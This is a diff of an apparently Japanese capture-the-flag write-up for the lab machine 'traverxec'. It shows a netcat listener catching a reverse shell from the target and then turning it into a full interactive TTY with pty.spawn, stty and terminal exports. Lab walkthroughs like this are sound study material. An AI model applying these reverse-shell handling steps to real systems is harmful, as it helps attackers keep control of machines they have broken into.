@@ -118,11 +118,27 @@ TypeError: a bytes-like object is required, not 'str'
 ```
 リバースシェル取得！がユーザフラグすら権限がたりない状況
 ```sh
-└─$ rlwrap nc -lnvp 4444
+└─$ nc -lnvp 4444
 listening on [any] 4444 ...
 connect to [10.10.16.7] from (UNKNOWN) [10.129.182.22] 44468
 bash: cannot set terminal process group (761): Inappropriate ioctl for device
 bash: no job control in this shell
+www-data@traverxec:/usr/bin$ python -c 'import pty; pty.spawn("/bin/bash")'
+python -c 'import pty; pty.spawn("/bin/bash")'
+
+www-data@traverxec:/usr/bin$ ^Z
+zsh: suspended  nc -lnvp 4444
+
+└─$ stty raw -echo; fg
+[1]  + continued  nc -lnvp 4444
+                               ^C
+
+www-data@traverxec:/usr/bin$ export SHELL=bash
+
+www-data@traverxec:/usr/bin$ export TERM=xterm-256color
+
+www-data@traverxec:/usr/bin$ stty rows 66 columns 236
+
 www-data@traverxec:/usr/bin$ id
 id
 uid=33(www-data) gid=33(www-data) groups=33(www-data)
